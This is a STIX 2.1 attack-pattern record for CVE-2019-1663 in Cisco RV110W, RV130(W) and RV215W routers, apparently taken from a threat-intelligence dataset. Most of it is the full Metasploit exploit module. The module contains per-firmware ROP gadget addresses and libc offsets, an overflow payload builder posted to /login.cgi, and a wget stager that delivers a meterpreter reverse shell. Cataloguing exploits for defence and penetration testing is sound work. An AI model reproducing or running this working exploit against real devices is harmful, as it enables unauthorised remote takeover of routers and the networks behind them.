{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--834aa7d9-11a4-421f-a15b-0580fe1685e3",
    "created": "2024-08-14T17:02:46.266357Z",
    "modified": "2024-08-14T17:02:46.26636Z",
    "name": "Cisco RV110W/RV130(W)/RV215W Routers Management Interface Remote Command Execution",
    "description": " A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.  The vulnerability is due to improper validation of user-supplied data in the web-based management interface. An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.  A successful exploit could allow the attacker to execute arbitrary code on the underlying operating system of the affected device as a high-privilege user.  RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected. RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected. RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected.  Note: successful exploitation may not result in a session, and as such on_new_session will never repair the HTTP server, leading to a denial-of-service condition. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cve_2019_1663_cisco_rmi_rce.rb",
            "external_id": "cve_2019_1663_cisco_rmi_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-1663"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-cmd-ex"
        },
        {
            "source_name": "reference",
            "url": "https://www.pentestpartners.com/security-blog/cisco-rv130-its-2019-but-yet-strcpy/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# linux/armle/meterpreter/bind_tcp -> segfault\n# linux/armle/meterpreter/reverse_tcp -> segfault\n# linux/armle/meterpreter_reverse_http -> works\n# linux/armle/meterpreter_reverse_https -> works\n# linux/armle/meterpreter_reverse_tcp -> works\n# linux/armle/shell/bind_tcp -> segfault\n# linux/armle/shell/reverse_tcp -> segfault\n# linux/armle/shell_bind_tcp -> segfault\n# linux/armle/shell_reverse_tcp -> segfault\n#\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Module::Deprecated\n\n  moved_from 'exploit/linux/http/cisco_rv130_rmi_rce'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco RV110W/RV130(W)/RV215W Routers Management Interface Remote Command Execution',\n        'Description' => %q{\n          A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall,\n          Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router\n          could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.\n\n          The vulnerability is due to improper validation of user-supplied data in the web-based management interface.\n          An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.\n\n          A successful exploit could allow the attacker to execute arbitrary code on the underlying operating\n          system of the affected device as a high-privilege user.\n\n          RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected.\n          RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.\n          RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected.\n\n          Note: successful exploitation may not result in a session, and as such,\n          on_new_session will never repair the HTTP server, leading to a denial-of-service condition.\n        },\n        'Author' => [\n          'Yu Zhang', # Initial discovery (GeekPwn conference)\n          'Haoliang Lu', # Initial discovery (GeekPwn conference)\n          'T. Shiomitsu', # Initial discovery (Pen Test Partners)\n          'Quentin Kaiser <kaiserquentin@gmail.com>' # Vulnerability analysis & exploit dev\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => %w[linux],\n        'Arch' => [ARCH_ARMLE, ARCH_MIPSLE],\n        'SessionTypes' => %w[meterpreter],\n        'CmdStagerFlavor' => %w{wget},\n        'Privileged' => true, # BusyBox\n        'References' => [\n          ['CVE', '2019-1663'],\n          ['BID', '107185'],\n          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-cmd-ex'],\n          ['URL', 'https://www.pentestpartners.com/security-blog/cisco-rv130-its-2019-but-yet-strcpy/']\n        ],\n        'DefaultOptions' => {\n          'WfsDelay' => 10,\n          'SSL' => true,\n          'RPORT' => 443,\n          'CMDSTAGER::FLAVOR' => 'wget',\n          'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n        },\n        'Targets' => [\n          [\n            'Cisco RV110W 1.1.0.9',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af06000,\n              'libcrypto_base_addr' => 0x2ac01000,\n              'system_offset' => 0x00050d40,\n              'got_offset' => 0x0009d560,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x00167c8c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV110W 1.2.0.9',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af08000,\n              'libcrypto_base_addr' => 0x2ac03000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x00098db0,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x00167c4c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV110W 1.2.0.10',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af09000,\n              'libcrypto_base_addr' => 0x2ac04000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x00098db0,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x00151fbc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV110W 1.2.1.4',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af54000,\n              'libcrypto_base_addr' => 0x2ac4f000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x00098db0,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV110W 1.2.1.7',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af98000,\n              'libcrypto_base_addr' => 0x2ac4f000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x00098db0,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x0003e7dc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV130/RV130W < 1.0.3.45',\n            {\n              'offset' => 446,\n              'libc_base_addr' => 0x357fb000,\n              'system_offset' => 0x0004d144,\n              'gadget1' => 0x00020e79, # pop {r2, r6, pc};\n              'gadget2' => 0x00041308, # mov r0, sp; blx r2;\n              'Arch' => ARCH_ARMLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp',\n              }\n            },\n          ],\n          [\n            'Cisco RV215W 1.1.0.5',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af59000,\n              'libcrypto_base_addr' => 0x2ac54000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x00098db0,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV215W 1.1.0.6',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af59000,\n              'libcrypto_base_addr' => 0x2ac54000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x00098db0,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x00151fbc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV215W 1.2.0.14',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af5f000,\n              'libcrypto_base_addr' => 0x2ac5a001,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x00098db0,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV215W 1.2.0.15',\n            {\n              'offset' => 69,\n              'libc_base_addr' => 0x2af5f000,\n              'libcrypto_base_addr' => 0x2ac5a000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x00098db0,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV215W 1.3.0.7',\n            {\n              'offset' => 77,\n              'libc_base_addr' => 0x2afeb000,\n              'libcrypto_base_addr' => 0x2aca5000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x000a0530,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x00057bec, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n          [\n            'Cisco RV215W 1.3.0.8',\n            {\n              'offset' => 77,\n              'libc_base_addr' => 0x2afee000,\n              'libcrypto_base_addr' => 0x2aca5000,\n              'system_offset' => 0x0004c7e0,\n              'got_offset' => 0x000a0530,\n              # gadget 1 is in /usr/lib/libcrypto.so\n              'gadget1' => 0x0003e7dc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;\n              'Arch' => ARCH_MIPSLE,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp',\n              }\n            }\n          ],\n        ],\n        'DisclosureDate' => '2019-02-27',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_DOWN, ],\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        },\n      )\n    )\n  end\n\n  def p(lib, offset)\n    [(lib + offset).to_s(16)].pack('H*').reverse\n  end\n\n  def prepare_shellcode(cmd)\n    case target\n    # RV110W 1.1.0.9, 1.2.0.9, 1.2.0.10, 1.2.1.4, 1.2.1.7\n    # RV215W 1.1.0.5, 1.1.0.6, 1.2.0.14, 1.2.0.15, 1.3.0.7, 1.3.0.8\n    when targets[0], targets[1], targets[2], targets[3], targets[4], targets[6], targets[7], targets[8], targets[9], targets[10], targets[11]\n      shellcode = rand_text_alpha(target['offset']) + # filler\n                  rand_text_alpha(4) +                                    # $s0\n                  rand_text_alpha(4) +                                    # $s1\n                  rand_text_alpha(4) +                                    # $s2\n                  rand_text_alpha(4) +                                    # $s3\n                  p(target['libc_base_addr'], target['system_offset']) +  # $s4\n                  rand_text_alpha(4) +                                    # $s5\n                  rand_text_alpha(4) +                                    # $s6\n                  rand_text_alpha(4) +                                    # $s7\n                  rand_text_alpha(4) +                                    # $s8\n                  p(target['libcrypto_base_addr'], target['gadget1']) +   # $ra\n                  p(target['libc_base_addr'], target['got_offset']) +\n                  rand_text_alpha(28) +\n                  cmd\n      shellcode\n    when targets[5] # RV130/RV130W\n      shellcode = rand_text_alpha(target['offset']) + # filler\n                  p(target['libc_base_addr'], target['gadget1']) +\n                  p(target['libc_base_addr'], target['system_offset']) +  # r2\n                  rand_text_alpha(4) +                                    # r6\n                  p(target['libc_base_addr'], target['gadget2']) +        # pc\n                  cmd\n      shellcode\n    end\n  end\n\n  def send_request(buffer)\n    begin\n      send_request_cgi({\n        'uri' => '/login.cgi',\n        'method' => 'POST',\n        'vars_post' => {\n          submit_button: \"login\",\n          submit_type: \"\",\n          gui_action: \"\",\n          wait_time: 0,\n          change_action: \"\",\n          enc: 1,\n          user: rand_text_alpha_lower(5),\n          pwd: buffer,\n          sel_lang: \"EN\"\n        }\n      })\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the router\")\n    end\n  end\n\n  def check\n    # We fingerprint devices using SHA1 hash of a web resource accessible to unauthenticated users.\n    # We use lang_pack/EN.js because it's the one file that changes the most between versions.\n    # Note that it's not a smoking gun given that some branches keep the exact same files in /www\n    # (see RV110 branch 1.2.1.x/1.2.2.x, RV130 > 1.0.3.22, RV215 1.2.0.x/1.3.x)\n\n    fingerprints = {\n      \"69d906ddd59eb6755a7b9c4f46ea11cdaa47c706\" => {\n        \"version\" => \"Cisco RV110W 1.1.0.9\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"8d3b677d870425198f7fae94d6cfe262551aa8bd\" => {\n        \"version\" => \"Cisco RV110W 1.2.0.9\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"134ee643ec877641030211193a43cc5e93c96a06\" => {\n        \"version\" => \"Cisco RV110W 1.2.0.10\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"e3b2ec9d099a3e3468f8437e5247723643ff830e\" => {\n        \"version\" => \"Cisco RV110W 1.2.1.4, 1.2.1.7, 1.2.2.1 (not vulnerable), 1.2.2.4 (not vulnerable)\",\n        \"status\" => Exploit::CheckCode::Unknown\n      },\n      \"6b7b1e8097e8dda26db27a09b8176b9c32b349b3\" => {\n        \"version\" => \"Cisco RV130/RV130W 1.0.0.21\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"9b1a87b752d11c5ba97dd80d6bae415532615266\" => {\n        \"version\" => \"Cisco RV130/RV130W 1.0.1.3\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"9b6399842ef69cf94409b65c4c61017c862b9d09\" => {\n        \"version\" => \"Cisco RV130/RV130W 1.0.2.7\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"8680ec6df4f8937acd3505a4dd36d40cb02c2bd6\" => {\n        \"version\" => \"Cisco RV130/RV130W 1.0.3.14, 1.0.3.16\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"8c8e05de96810a02344d96588c09b21c491ede2d\" => {\n        \"version\" => \"Cisco RV130/RV130W 1.0.3.22, 1.0.3.28, 1.0.3.44, 1.0.3.45 (not vulnerable), 1.0.3.51 (not vulnerable)\",\n        \"status\" => Exploit::CheckCode::Unknown\n      },\n      \"2f29a0dfa78063d643eb17388e27d3f804ff6765\" => {\n        \"version\" => \"Cisco RV215W 1.1.0.5\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"e5cc84d7c9c2d840af85d5f25cee33baffe3ca6f\" => {\n        \"version\" => \"Cisco RV215W 1.1.0.6\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"7cc8fcce5949a68c31641c38255e7f6ed31ff4db\" => {\n        \"version\" => \"Cisco RV215W 1.2.0.14 or 1.2.0.15\",\n        \"status\" => Exploit::CheckCode::Vulnerable\n      },\n      \"050d47ea944eaeadaec08945741e8e380f796741\" => {\n        \"version\" => \"Cisco RV215W 1.3.0.7 or 1.3.0.8, 1.3.1.1 (not vulnerable), 1.3.1.4 (not vulnerable)\",\n        \"status\" => Exploit::CheckCode::Unknown\n      }\n    }\n\n    uri = target_uri.path\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'lang_pack/EN.js')\n    })\n    if res && res.code == 200\n      fingerprint = Digest::SHA1.hexdigest(\"#{res.body.to_s}\")\n      if fingerprints.key?(fingerprint)\n        print_good(\"Successfully identified device: #{fingerprints[fingerprint][\"version\"]}\")\n        return fingerprints[fingerprint][\"status\"]\n      else\n        print_status(\"Couldn't reliably fingerprint the target.\")\n      end\n    end\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status('Sending request')\n    execute_cmdstager\n  end\n\n  def execute_command(cmd, opts = {})\n    shellcode = prepare_shellcode(cmd.to_s)\n    send_request(shellcode)\n  end\n\n  def on_new_session(session)\n    # Given there is no process continuation here, the httpd server will stop\n    # functioning properly and we need to take care of proper restart\n    # ourselves.\n    print_status(\"Reloading httpd service\")\n    reload_httpd_service = \"killall httpd && cd /www && httpd && httpd -S\"\n    if session.type.to_s.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n      session.sys.process.execute '/bin/sh', \"-c \\\"#{reload_httpd_service}\\\"\"\n    else\n      session.shell_command(reload_httpd_service)\n    end\n  ensure\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-02-27",
    "x_mitre_platforms": [
        "%w[linux]"
    ]
}